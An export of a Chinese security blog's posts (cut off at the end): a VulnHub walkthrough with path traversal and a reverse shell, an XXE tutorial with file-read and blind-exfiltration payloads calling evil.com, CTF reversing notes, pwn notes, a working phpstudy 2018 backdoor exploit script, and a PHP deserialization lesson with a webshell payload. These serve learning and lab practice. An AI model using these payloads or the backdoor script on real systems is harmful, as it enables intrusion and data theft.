#组名2）password #密码位置3）GID #组ID4）user #组成员 /usr/local/app/php5/lib/php.ini #PHP相关设置/usr/local/app/apache2/conf/extra/httpd-vhosts.conf #虚拟网站设置/etc/httpd/conf/httpd.conf或/usr/local/apche/conf/httpd.conf #linux APACHE虚拟主机配置文件/usr/local/resin-3.0.22/conf/resin.conf #3.0.22的RESIN配置文件/usr/local/resin-pro-3.0.22/conf/resin.conf /usr/local/app/apache2/conf/extra/httpd-vhosts.conf #APASHE虚拟主机/etc/httpd/conf/httpd.conf或/usr/local/apche/conf /httpd.conf #linux APACHE虚拟主机配置文件/usr/local/resin-3.0.22/conf/resin.conf #3.0.22的RESIN配置文件/usr/local/resin-pro-3.0.22/conf/resin.conf /usr/local/app/apache2/conf/extra/httpd-vhosts.conf #APASHE虚拟主机/etc/sysconfig/iptables #查看防火墙策略/root/.mysql_history、/root/.bash_history      #Mysql账号密码信息</code></pre><p>最后一个**.mysql_history** #mysql账号密码信息</p><p>这里写的是/root/用户，就猜想是否存在两个用户里面</p><pre><code class="language-HTML">GET /..%2f..%2f..%2fhome%2fweborf%2f.mysql_history</code></pre><p><img src="%E6%8D%95%E8%8E%B76.PNG" alt="捕获6"></p><p>找到 weborf 用户的密码。</p><p>使用ssh登入上去</p><p><img src="%E6%8D%95%E8%8E%B77.PNG" alt="捕获7"></p><p><strong>登入成功！！！</strong></p><p>到这一步就可以开始渗透提权了</p><h3 id="0x01-2-提权">0x01.2 提权</h3><p>发现用户的等级不是很高。打算来提权一下</p><p><img src="%E6%8D%95%E8%8E%B78.PNG" alt="捕获8"></p><p><strong>想到之前的mysql有半开放的状态。于是有个猜想。</strong></p><p><strong>是不是只允许本地登入mysql，测试了一下</strong></p><p><img src="%E6%8D%95%E8%8E%B79.PNG" alt="捕获9"></p><p>登入成功！</p><p>查询了一番数据库发现存在另一个用户的密码。</p><p><img src="%E6%8D%95%E8%8E%B710.PNG" alt="捕获10"></p><p>现在得到了 另一个用户的 密码。</p><p>现在切换用户</p><p><img src="%E6%8D%95%E8%8E%B711.PNG" alt="捕获11"></p><p>发现权限也不是特别高。不过算是进入了正常的用户了。</p><p>开始提权</p><pre><code>sudo su</code></pre><p>测试了一下，发现不行</p><p>在百思不得其解的时候。去问了问一些大佬。</p><p>有个大佬跟我说看看有没有 wine，可以用wine 建立反向连接。再用sudo -l 查一下该用户有那些权限</p><p><img src="%E6%8D%95%E8%8E%B713.PNG" alt="捕获13"></p><p>存在。</p><pre><code>sudo -l#显示出自己（执行 sudo 的使用者）的权限</code></pre><p><img src="%E6%8D%95%E8%8E%B714.PNG" alt="捕获14"></p><p>scp 传了下msfveom windows 反向连接</p><p><img src="%E6%8D%95%E8%8E%B715.PNG" alt="捕获15"></p><p>scp muma.exe <a href="mailto:sunrise@172.16.123.109" target="_blank" rel="noopener">sunrise@172.16.123.109</a>:/home/sunrise/muma.exe</p><p><img src="%E6%8D%95%E8%8E%B716.PNG" alt="捕获16"></p><p>开始反弹。</p><p><img src="%E6%8D%95%E8%8E%B717-1576324766059.PNG" alt="捕获17"></p><h3 id="0x01-3-查看flag">0x01.3 查看flag</h3><p>试试是否能直接读取root.txt</p><pre><code>cat /root/root.txt</code></pre><p><img src="%E6%8D%95%E8%8E%B718.PNG" alt="捕获18"></p><p>成功！</p>]]></content>
      
      
      <categories>
          
          <category> vulnhub </category>
          
      </categories>
      
      
        <tags>
            
            <tag> vulnhub </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XXE漏洞学习</title>
      <link href="/2019/12/03/xxe/"/>
      <url>/2019/12/03/xxe/</url>
      
        <content type="html"><![CDATA[<h1 id="0x00-前言">0x00 前言</h1><p>最近看到挺多XXE漏洞的，于是打算来浅入学习下。</p><a id="more"></a><h1 id="0x01漏洞产生">0x01漏洞产生</h1><p>XXE漏洞全称XML External Entity Injection 即xml外部实体注入漏洞，XXE漏洞发生在应用程序解析XML输入时，<strong>没有禁止外部实体的加载</strong>，导致可加载恶意外部文件和代码，造成<strong>任意文件读取</strong>、<strong>命令执行</strong>、<strong>内网端口扫描</strong>、<strong>攻击内网网站</strong>、<strong>发起Dos攻击</strong>等危害。</p><p>XXE漏洞触发的点往往是可以上传xml文件的位置，没有对上传的xml文件进行过滤，导致可上传恶意xml文件。</p><h2 id="0x01-1-XML基础">0x01.1 XML基础</h2><p>要了解XXE漏洞，先要搞懂一定的基础知识，了解XML文档的基础组成。</p><p>XML 指可扩展标记语言（Extensible Markup Language）</p><pre><code>XML 被设计用来传输和存储数据。HTML 被设计用来显示数据</code></pre><p>XML把数据从HTML分离，XML是独立于软件和硬件的信息传输工具。</p><p>XML语言没有预定义的标签，允许作者定义自己的标签和自己的文档结构</p><p>XML的语法规则：</p><ul><li><p>XML文档必须有一个根元素</p></li><li><p>XML元素都必须有一个关闭标签</p></li><li><p>XML标签对大小敏感</p></li><li><p>XML元素必须被正确的嵌套</p></li><li><p>XML属性值必须加引导</p><pre><code class="language-xml">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt; &lt;!--XML 声明--&gt;&lt;girl age=&quot;18&quot;&gt;　　&lt;!--自定的根元素girl;age属性需要加引导--&gt;&lt;hair&gt;长头发&lt;/hair&gt;　　&lt;!--自定义的4个子元素，即girl对象的属性--&gt;&lt;eye&gt;大眼睛&lt;/eye&gt;&lt;face&gt;可爱的脸庞&lt;/face&gt;&lt;summary&gt;可爱美丽的女孩&lt;/summary&gt;&lt;/girl&gt;　　&lt;!--根元素的闭合--&gt;</code></pre></li></ul><h3 id="实体引用">实体引用</h3><p>在XML中，一些字符拥有特殊的意义。</p><p>如果把字符&quot;&lt;&quot;放在XML元素中，会发生错误，这是因为解释器会把它作为新元素的开始。</p><p><strong>例子:</strong></p><pre><code class="language-xml">&lt;message&gt;if salary &lt; 1000 then&lt;/message&gt;</code></pre><p>为了避免这个错误，请用<strong>实体引用</strong>来代替 “&lt;” 字符：</p><pre><code class="language-xml">&lt;message&gt;if salary &amp;lt; 1000 then&lt;/message&gt;</code></pre><p>在 XML 中，有 5 个预定义的实体引用：</p><table><thead><tr><th>&amp;lt</th><th>&lt;</th><th>小于号</th></tr></thead><tbody><tr><td>&amp;gt</td><td>&gt;</td><td>大于号</td></tr><tr><td>&amp;amp</td><td>&amp;</td><td>和号</td></tr><tr><td>&amp;apos</td><td>’</td><td>单引号</td></tr><tr><td>&amp;quot</td><td>&quot;</td><td>引号</td></tr></tbody></table><p>DTD（文档类型定义）的作用是定义XML文档的合法构建模块</p><p>DTD 可被成行地声明于 XML 文档中，也可作为一个外部引用。</p><pre><code class="language-xml">&lt;!--XML声明--&gt;&lt;?xml version=&quot;1.0&quot;?&gt; &lt;!--文档类型定义--&gt;&lt;!DOCTYPE note [  　　&lt;!--定义此文档是 note 类型的文档--&gt;&lt;!ELEMENT note (to,from,heading,body)&gt;  &lt;!--定义note元素有四个元素--&gt;&lt;!ELEMENT to (#PCDATA)&gt;     &lt;!--定义to元素为”#PCDATA”类型--&gt;&lt;!ELEMENT from (#PCDATA)&gt;   &lt;!--定义from元素为”#PCDATA”类型--&gt;&lt;!ELEMENT head (#PCDATA)&gt;   &lt;!--定义head元素为”#PCDATA”类型--&gt;&lt;!ELEMENT body (#PCDATA)&gt;   &lt;!--定义body元素为”#PCDATA”类型--&gt;]]]&gt;&lt;!--文档元素--&gt;&lt;note&gt;&lt;to&gt;Dave&lt;/to&gt;&lt;from&gt;Tom&lt;/from&gt;&lt;head&gt;Reminder&lt;/head&gt;&lt;body&gt;You are a good man&lt;/body&gt;&lt;/note&gt;</code></pre><p>上述XML代码基本分为三个部分：</p><ul><li>第一部分是XML的声明；</li><li>第二部分是XML的DTD文档类型定义</li><li>第三部分是XML语句</li></ul><p>而外部实体攻击主要利用DTD的外部实体来进行注入的。</p><p>DTD有两种构建方式，分别为<strong>内部DTD声明</strong>和<strong>外部DTD声明</strong></p><blockquote><p>​tips: DTD = Document Type Definition 简称</p></blockquote><p><strong>内部DTD声明：</strong></p><pre><code class="language-xml">&lt;!DOCTYPE 根元素 [元素声明]&gt;</code></pre><p>实例：如上述代码</p><p><strong>外部DTD声明：</strong></p><pre><code class="language-xml">&lt;!DOCTYPE 根元素 SYSTEM &quot;文件名&quot;&gt;</code></pre><p>实例：</p><pre><code class="language-xml">&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE root-element SYSTEM &quot;test.dtd&quot;&gt;&lt;note&gt;&lt;to&gt;Y&lt;/to&gt;&lt;from&gt;K&lt;/from&gt;&lt;head&gt;J&lt;/head&gt;&lt;body&gt;ESHLkangi&lt;/body&gt;&lt;/note&gt;</code></pre><h1 id="0x02-XML简单用法">0x02 XML简单用法</h1><pre><code class="language-XML">&lt;!ENTITY 实体名称 &quot;实体的值&quot;&gt;</code></pre><p>外部实体:</p><pre><code class="language-XML">&lt;!ENTITY 实体名称 SYSTEM &quot;URI&quot;&gt;</code></pre><p>参数实体:</p><pre><code class="language-XML">&lt;!ENTITY % 实体名称 &quot;实体的值&quot;&gt;</code></pre><p>或者</p><pre><code class="language-XML">&lt;!ENTITY % 实体名称 SYSTEM &quot;URI&quot;&gt;</code></pre><p>实列演示:  除参数实体外实体+内部实体</p><pre><code class="language-XML">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&lt;!DOCTYPE a[&lt;!ENTITY name &quot;nMask&quot;&gt;]&gt;&lt;foo&gt;    &lt;value&gt;&amp;name;&lt;/value&gt;&lt;/foo&gt;</code></pre><p>实列演示: 参数实体+外部实体</p><pre><code class="language-XML">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&lt;!DOCTYPE a[&lt;!ENTITY % name SYSTEM &quot;file:///etc/passwd&quot;&gt;%name;]&gt;</code></pre><p>注意：%name（参数实体）是在DTD中被引用的，而&amp;name（其余实体）是在xml文档中被引用的。</p><p>由于xxe漏洞主要是利用了DTD引用外部实体导致的漏洞，那么重点看下能引用哪些类型的外部实体。</p><p>外部实体 外部实体即在DTD中使用</p><pre><code class="language-xml">&lt;!ENTITY 实体名称 SYSTEM &quot;URI&quot;&gt;</code></pre><p>实例演示：</p><pre><code class="language-XML">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&lt;!DOCTYPE a[ //定义一个外部名称&lt;!ENTITY content SYSTEM &quot;file:///etc/passwd&quot;&gt;]&gt; //SYSTEM &quot;file:///xxxx&quot; 用于读取文件&lt;foo&gt;&lt;value&gt;&amp;content;&lt;/value&gt;&lt;/foo&gt;</code></pre><p>得带Content-Type: application/xml头，</p><p>如果请求头类似于：Content-Type: application/json，</p><p>那么可以改为Content-Type: application/xml试试有没有xml漏洞</p><h1 id="0x03-XXE漏洞实战">0x03 XXE漏洞实战</h1><p>题目地址：<a href="http://web.jarvisoj.com:9882" target="_blank" rel="noopener">web.jarvisoj.com:9882</a></p><p><img src="1.PNG" alt="1"></p><p>我们抓包看一下</p><p><img src="2.PNG" alt="2"></p><p>现在我们尝试把 <strong>Content-Type: application/json</strong> 改成 <strong>application/xml</strong></p><p>发送以下内容探测是否存在XXE</p><pre><code class="language-XML">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;!DOCTYPE TEST [ &lt;!ENTITY xxe &quot;XXE TEST&quot;&gt; //XXE Test是输出的内容 xxe可以为理解为一个变量 ]&gt;&lt;foo&gt; //乱取个名就好  &amp;xxe; //理解为引用变量地址输出&lt;/foo&gt; </code></pre><p><img src="3.PNG" alt="3"></p><p>读取文件测试</p><p><img src="4.PNG" alt="4"></p><p>读取flag测试</p><p><img src="5.PNG" alt="5"></p><h2 id="0x03-1-下面列出其他的用法">0x03.1 下面列出其他的用法</h2><p>XML文档是用PHP进行解析的，那么还可以使用php:*//filter协议来进行读取。</p><pre><code class="language-XML">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; &lt;!DOCTYPE root [ &lt;!ENTITY content SYSTEM &quot;php://filter/resource=c:/windows/win.ini&quot;&gt; ]&gt; &lt;root&gt;&lt;foo&gt;&amp;content;&lt;/foo&gt;&lt;/root&gt; </code></pre><p>端口扫描 加载外部DTD时有两种加载方式，一种为私有private，第二种为公共public。 私有类型DTD加载：</p><pre><code class="language-XML">&lt;!ENTITY private_dtd SYSTEM &quot;DTD_location&quot;&gt;</code></pre><p>公共类型DTD加载：</p><pre><code class="language-XML">&lt;!ENTITY public_dtd PUBLIC &quot;DTD_name&quot; &quot;DTD_location&quot;&gt;</code></pre><p>在公共类型DTD加载的时候，首先会使用DTD_name来检索，如果无法找到，则通过DTD_location来寻找此公共DTD。利用DTD_location，在一定的环境下可以用来做内网探测。</p><pre><code class="language-XML">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&lt;!DOCTYPE root [    &lt;!ENTITY portscan SYSTEM &quot;http://localhost:3389&quot;&gt;]&gt;&lt;root&gt;&lt;foo&gt;&amp;portscan;&lt;/foo&gt;&lt;/root&gt;</code></pre><p>blind xxe漏洞: 对于传统的XXE来说，要求攻击者只有在服务器有回显或者报错的基础上才能使用XXE漏洞来读取服务器端文件，如果没有回显则可以使用Blind XXE漏洞来构建一条带外信道提取数据。</p><p>利用DTD进行数据回显 有时读取文件时没有回显，这时可以利用DTD参数实体的特性将文件内容拼接到url中，达到读取文件的效果。</p><pre><code class="language-XML">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; &lt;!DOCTYPE root[     &lt;!ENTITY % file SYSTEM &quot;php://fileter/convert.base64-encode/resource=c:/windows/win.ini&quot;&gt;      &lt;!ENTITY % dtd SYSTEM &quot;http://192.168.1.100:8000/evil.dtd&quot;&gt;     %dtd;      %send;]&gt; &lt;root&gt;&lt;/root&gt;evil.dtd &lt;!ENTITY % payload &quot;&lt;!ENTITY &amp;#x25; send SYSTEM 'http://evil.com/?content=%file;'&gt;&quot;&gt;%payload;</code></pre><p>在evil.dtd中将%file实体的内容拼接到url后，然后利用burp等工具，查看url请求就能获得我们需要的内容</p><h1 id="0x04-参考链接">0x04 参考链接</h1><blockquote><p>我个人认为讲的最好的链接：</p><p><a href="http://xz.aliyun.com/t/6887" target="_blank" rel="noopener">http://xz.aliyun.com/t/6887</a></p><hr><p><a href="https://www.freebuf.com/articles/web/177979.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/web/177979.html</a></p><p><a href="https://www.cnblogs.com/vincebye/p/7199290.html" target="_blank" rel="noopener">https://www.cnblogs.com/vincebye/p/7199290.html</a></p><p><a href="https://www.jianshu.com/p/ec2888780308" target="_blank" rel="noopener">https://www.jianshu.com/p/ec2888780308</a></p><p><a href="https://www.cnblogs.com/ESHLkangi/p/9245404.html" target="_blank" rel="noopener">https://www.cnblogs.com/ESHLkangi/p/9245404.html</a></p></blockquote><p><strong>转载请标明出处</strong></p>]]></content>
      
      
      
        <tags>
            
            <tag> Note </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BugkuCTF逆向</title>
      <link href="/2019/11/06/BugkuCTF%E9%80%86%E5%90%91/"/>
      <url>/2019/11/06/BugkuCTF%E9%80%86%E5%90%91/</url>
      
        <content type="html"><![CDATA[<h1 id="0x00-开言">0x00 开言</h1><p>最近了解了点逆向，pwn，汇编，C，C#等知识，开始试着刷题实战一下。</p><a id="more"></a><h2 id="0x00-1-环境-工具">0x00.1 环境&amp;工具</h2><p>工具： IDA &amp; OD</p><p>环境：Windows7</p><h2 id="0x00-2-需要注意的事项">0x00.2 需要注意的事项</h2><blockquote><p><strong>tips: 在windows下逆向需要注意，从windowsXP以上都有开启aslr保护，</strong></p><p>​<strong>ASLR（Address space layout randomization）是一种针对缓冲区溢出的安全保护技术，通过对堆、栈、共享库映射等线性区布局的随机化，通过增加攻击者预测目的地址的难度，防止攻击者直接定位攻击代码位置，达到阻止溢出攻击的目的。</strong></p></blockquote><h1 id="0x01-入门逆向">0x01 入门逆向</h1><p>使用ida打开发现没有任何值得，查看的。直接 按F5查看伪代码 再按R转码         就完事了.</p><p><img src="1.PNG" alt="1"></p><h1 id="0x02-Easy-vb">0x02 Easy_vb</h1><p>ida打开 直接往下看。看到flag</p><p><img src="1-1573024106714.PNG" alt="1"></p><h1 id="0x03-Easy-re">0x03 Easy_re</h1><p>这次使用 od工具 。直接上只能搜索看看。</p><p><img src="1-1573024191980.PNG" alt="1"></p><h1 id="0x04-游戏过关">0x04 游戏过关</h1><p>这一题比较难。</p><blockquote><p>需要用到的工具:</p><p>ida &amp; od</p></blockquote><h2 id="0x04-1-第一步-IDA">0x04.1 第一步 IDA</h2><p><strong>我们先用 ida 和 od 打开 程序</strong></p><p><img src="1-1573024519658.PNG" alt="1"></p><p><img src="2.PNG" alt="2"></p><p><strong>我们先看ida这边，先看shift+f12看看字符串</strong></p><p>发现字符串窗口有个 <strong>done!!!the flag is</strong>  这里是最后得出flag的地方，我们先不看他，往下翻</p><p><img src="3.PNG" alt="3"></p><p><img src="4.PNG" alt="4"></p><p>这次我们看到 <strong>Play a game\n</strong> 这里是程序的 开头言的地方。我们双击跳过去看看。</p><p><img src="5.PNG" alt="5"></p><p>这里有调用<strong>aPlayAGameTheNI</strong>函数。我们按<strong>x</strong>跳到，调用他的地方。</p><p>他跳到了最上面的窗口。我们往下翻</p><p><img src="6.PNG" alt="6"></p><p>看到 <strong>input n,n 这里 是让用户输入(1-8)的地方</strong>。我们按<strong>F5</strong>看看伪代码</p><p><img src="7.PNG" alt="7"></p><p>分析一下伪代码。</p><p><img src="8.PNG" alt="8"></p><p>我们看到这里是给用户循环输入的地方 有个断点sub_459418();。就是我们要跳转的地方.</p><p>我们现在回到之前看到 <strong>done!!! the flag is</strong> 地方 跳转过去看一看。</p><p><img src="9.PNG" alt="9"></p><p>看到有一个函数为 <strong>aDoneTheFlagIs</strong>,</p><p>我们打开一个选项，能直接查看到这个的 <strong>基址</strong></p><p><img src="10.PNG" alt="10"></p><p>我们往上翻，找到这个的Top位置</p><p><img src="11.PNG" alt="11"></p><p>这里。<strong>0045E940</strong>我们记下来这个<strong>基址</strong></p><p>再把</p><p><img src="12.PNG" alt="12"></p><p>sub_459418();这里的基址记下来。</p><h2 id="0x04-2-第二步-OD">0x04.2 第二步 OD</h2><p>现在我们回到 od</p><p><img src="13.PNG" alt="13"></p><p>先这个程序运行起来。点播放键(左上角)</p><p>然后我们点<strong>Ctrl+G</strong> 来跳转地址到<strong>0045E940</strong>地方。</p><p><img src="14.PNG" alt="14"></p><p>按F2设置断点。然后到程序里随便输入个数字(1-8),发现该程序运行到了</p><p><img src="15.PNG" alt="15"></p><p><strong>0045f515地址</strong>这里停住了，接下来我们用<strong>0045e940</strong>这个地址</p><p>双击0045f515地址，写上jmp 0045e940(jmp为汇编码，意思跳转)</p><p><img src="16.PNG" alt="16"></p><p><img src="17-1573025913557.PNG" alt="17"></p><p>更新程序运行。点到该程序的循环位置，为止。(0045EB51)</p><p><img src="18.PNG" alt="18"></p><p>白框的位置便是　ｗｈｉｌｅ循环的地方<br>我们在0045EBC1地址设置断点　使这个程序直接跳过ｗｈｉｌｅ循环<br>设置断点后　点继续运行程序</p><p><img src="19.PNG" alt="19"></p><p><img src="20.PNG" alt="20"></p><p>拿到flag!</p><p><strong>转载请标明出处</strong></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> CTF-Reverse-Note </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF-Reverse-Note </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【Pwn】学习笔记第零期:开端</title>
      <link href="/2019/11/01/pwn%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-00/"/>
      <url>/2019/11/01/pwn%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-00/</url>
      
        <content type="html"><![CDATA[<h1 id="0x00-起因">0x00 起因</h1><p>有一次已经上了深职院的学长告诉我，深职院那边非常缺pwn选手。我一直挺头疼pwn题的，耗眼力。入门难。 而且这方面的资料也相对较少，所以学习pwn的人也是相对较少的。 不过为了多累计一些知识，硬着头皮尝试的往上顶。冲冲冲！！！</p><a id="more"></a><h1 id="0x01-需要具备的知识">0x01 需要具备的知识</h1><p>1.扎实的C基础<br>2.基本DS：链表、队列、栈<br>3.基本linux配置与命令<br>4.会汇编更好，不会的话现学几个常用的也可以救急。</p><h1 id="0x02-环境搭建">0x02 环境搭建</h1><p>使用的系统: ubuntu19</p><p>工具: python - pwntools</p><p>​  pwndbg</p><p>​  ida</p><p>​  gcc-multilib</p><p><strong>转载请标明出处</strong></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> CTF-Pwn-Note </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF-Pwn-Note </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【Pwn】学习笔记第一期:栈知识</title>
      <link href="/2019/11/01/pwn%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-01/"/>
      <url>/2019/11/01/pwn%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-01/</url>
      
        <content type="html"><![CDATA[<h1 id="0x00-需要具备的知识">0x00 需要具备的知识</h1><a id="more"></a><h3 id="编译程序的内存分配">编译程序的内存分配</h3><h4 id="栈区-stack">栈区 (stack)</h4><p>函数运行时分配，函数结束时释放。由编译器自动分配释放 ，存放为运行函数而分配的局部变量、函数参数、返回数据、返回地址等。其操作方式类似于数据结构中的栈。</p><h4 id="堆区-heap">堆区 (heap)</h4><p>一般由程序员分配释放， 若程序员不释放，程序结束时可能由OS（操作系统）回收。分配方式类似于链表。</p><h4 id="全局区-静态区static">全局区(静态区static)</h4><p>存放全局变量、静态数据、常量。程序结束后由系统释放。全局区分为已初始化全局区（data）和未初始化全局区（bss）。</p><h4 id="常量区-文字常量区">常量区(文字常量区)</h4><p>存放常量字符串，程序结束后有系统释放。</p><h4 id="代码区">代码区</h4><p>存放函数体（类成员函数和全局区）的二进制代码。</p><h1 id="0x01-堆栈-stack-知识">0x01 堆栈(stack)知识</h1><p><img src="%E5%A0%86%E6%A0%88.jpg" alt="堆栈"></p><p><strong>转载请标明出处</strong></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> CTF-Pwn-Note </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF-Pwn-Note </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>phpstudy2018_backdoor_exp</title>
      <link href="/2019/10/17/phpstudy2018-backdoor-exp/"/>
      <url>/2019/10/17/phpstudy2018-backdoor-exp/</url>
      
        <content type="html"><![CDATA[<h1 id="0x00-起因">0x00 起因</h1><p>前几个星期看到phpstudy带有后门程序。拖到现在才复现,看到可利用便立即写下利用脚本</p><a id="more"></a><h1 id="0x01-exp">0x01 exp</h1><pre><code class="language-python"># -*-coding:utf-8 -*-import base64import requestsdef Expoit(ip,exp):    payload = exp    pay = base64.b64encode(payload.encode('utf-8'))    headers = {    &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:55.0) Gecko/20100101 Firefox/55.0&quot;,    &quot;Accept&quot;: &quot;text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&quot;,    &quot;Accept-Language&quot;: &quot;zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3&quot;,    &quot;Connection&quot;: &quot;close&quot;,    &quot;Accept-Encoding&quot;: &quot;gzip,deflate&quot;,    &quot;Accept-Charset&quot;: pay,    &quot;Upgrade-Insecure-Requests&quot;: &quot;1&quot;,    }    print(headers)    url = ip    r = requests.get(url,headers=headers)Expoit(input(&quot;target url&gt;&quot;),input(&quot;payload&gt;&quot;))</code></pre><p><strong>转载请标明出处</strong></p>]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>php反序列化漏洞学习</title>
      <link href="/2019/10/05/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/"/>
      <url>/2019/10/05/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<h1 id="0x00-写在前面">0x00 写在前面</h1><p>PHP反序列化漏洞虽然利用的条件比较苛刻，但是如果可以利用一般都会产生很严重的后果。在春招的时候很多公司都问过这个问题，说明这个反序列化漏洞的技能点也是很多公司比较关注的技能点。</p><a id="more"></a><h1 id="0x01-PHP反序列化漏洞">0x01 PHP反序列化漏洞</h1><p><strong>PHP反序列化漏洞</strong>,一直围绕着两个函数serialize() 和unserialize()</p><pre><code class="language-php"> serialize() //是用于将类转换为一个字符串 unserialize() //用于将字符串转换回一个类</code></pre><h2 id="serialize">serialize()</h2><pre><code class="language-php">&lt;?phpclass fangxuliehua{    public $var1=&quot;test for fangxuliehua&quot;;}$fangxuliehua = new fangxuliehua();//根据fangxuliehua类实列化对象$fangxueliehua_ser = serialize($fangxuliehua);print_r($fangxueliehua_ser);?&gt;</code></pre><p><img src="xueliehua1.jpg" alt="序列化"></p><p>我们这边创建了新的对象，并将他序列化打印出来。结果为：</p><pre><code class="language-json">O:12:&quot;fangxuliehua&quot;:1:{s:4:&quot;var1&quot;;s:4:&quot;test&quot;;}</code></pre><blockquote><p>这里的<strong>O</strong>代表的是存储对象(Object),<strong>12</strong>则是12个字符，也就是存储对象里有12个字符。<strong>“fangxuliehua”<strong>则是对象的名称，这里的</strong>1</strong>则代表了**{s:4:“var1”;s:4:“test”;}** 里面有一个值。<strong>s</strong>表示字符串，<strong>4</strong>则长度。**“var1”**为字符串名字，后面的相同</p></blockquote><h2 id="unserialize">unserialize()</h2><p>与 serialize() 对应的，unserialize()可以从已存储的表示中创建PHP的值，单就本次所关心的环境而言，可以从序列化后的结果中恢复对象（object）。</p><pre><code class="language-php">&lt;?php    class fanguxliehua{    public $var1=&quot;test&quot;;}$class= 'O:12:&quot;fangxuliehua&quot;:1:{s:4:&quot;var1&quot;;s:4:&quot;test&quot;;}';print_r($class);echo &quot;&lt;/br&gt;&quot;;$class_unser=unserialize($class);print_r($class_unser);?&gt;</code></pre><p><img src="fangxuliehua2.jpg" alt="反序列化"></p><p><strong>tips:这里使用unserialize()时，会调用__wakeup()成员函数</strong></p><h1 id="0x02-反序列化漏洞产生原因">0x02 反序列化漏洞产生原因</h1><p>当传给 unserialize() 的参数可控时，我们可以通过传入一个精心构造的序列化字符串，从而控制对象内部的变量甚至是函数。</p><h1 id="0x03-利用函数构造PAYLOAD">0x03 利用函数构造PAYLOAD</h1><h3 id="Magic-function">Magic function</h3><p>php中有一类特殊的方法叫&quot;魔法函数&quot;(Magic function)， 这里我列出了与 php(反)序列化有关的几个魔法函数:</p><pre><code class="language-php">__construct()//当一个对象创造时被调用__destruct()//当对象被销毁时触发__wakeup()//使用unserialize()时触发__sleep()//使用serialize()时触发__toString()//把类当作字符串使用时触发__get()//用于从不可访问的属性读取数据__set()//用于将数据写入不可访问的属性__isset()//在不可访问的属性上调用isset()或empty()触发__unset()//在不可访问的属性上使用unset()时触发__invoke()//当脚本尝试将对象调用为函数时触发</code></pre><p>这里我们着重关注一下几个：</p><ul><li><p>构造函数__construct()：当对象创建(new)时会自动调用。但在unserialize()时是不会自动调用的。</p></li><li><p>析构函数__destruct()：当对象被销毁时会自动调用。</p></li><li><p>__wakeup() ：如前所提，unserialize()时会自动调用。</p></li></ul><p>代码如下:</p><pre><code class="language-php">&lt;?phpclass test{    var $var='123';    function __wakeup(){        echo &quot;__wakeup&quot;.&quot;&lt;br&gt;&quot;;    }    function __construct(){        echo &quot;__construct&quot;.&quot;&lt;br&gt;&quot;;    }    function __destruct(){        echo &quot;__destruct&quot;.&quot;&lt;br&gt;&quot;;    }}echo &quot;序列化所调用的函数:&quot;.&quot;&lt;br&gt;&quot;;$data=new test();//根据test类实列化对象$data=serialize($data);echo &quot;反序列化所调用的函数:&quot;.&quot;&lt;br&gt;&quot;;$data1=unserialize($data);print_r($data1);?&gt;</code></pre><p><img src="xuliehua3.jpg" alt="(反)序列化"></p><h3 id="利用示范">利用示范</h3><h4 id="wakeup-或-destruct">_wakeup() 或__destruct()</h4><p>前面说了利用都是基于“自动调用”的magic function。从而当我们控制序列化字符串时可以去直接触发它们。</p><p>这里针对 __wakeup() 场景做个实验。假设index源码如下：</p><pre><code class="language-php">&lt;?phpclass test{var $test = 'test';function __wakeup(){$fp = fopen(&quot;webshell.php&quot;,&quot;w&quot;) ;fwrite($fp,$this-&gt;test);fclose($fp);}}$class_get = $_GET['test'];print_r($class_get);echo &quot;&lt;/br&gt;&quot;;$class_get_unser = unserialize($class_get);include_once(&quot;webshell.php&quot;) //包含一下，让它能显示效果    ?&gt;</code></pre><p>webshell.php需要自己建立。在同目录下建立了一个webshell.php，最先访问index.php</p><p>基本思路是，通过<strong>serialize()<strong>得到我们想要的序列化字符串，之后再传进去。假设我们已知index.php源码。把对象中的</strong>$test</strong>赋值再调用<strong>unserialize()<strong>时会通过</strong>__wakeup()<strong>把</strong>$test</strong>的写入到shell.php中。</p><p>我们写个php脚本:</p><pre><code class="language-php">class payload{public $target=&quot;&lt;?php $a=$_GET[cmd];system($a);?&gt;&quot;;}$a =serialize(new payload);echo $a;</code></pre><p>序列化后输出:</p><pre><code class="language-php">O:7:&quot;payload&quot;:1:{s:4:&quot;test&quot;;s:33:&quot;&quot;;}</code></pre><p>s:33:&quot;&quot;里面没有payload我们自己写进去:</p><p><strong>tips:与target=里面的?&gt;&quot;发生了冲突，还未找到解决方案</strong></p><pre><code 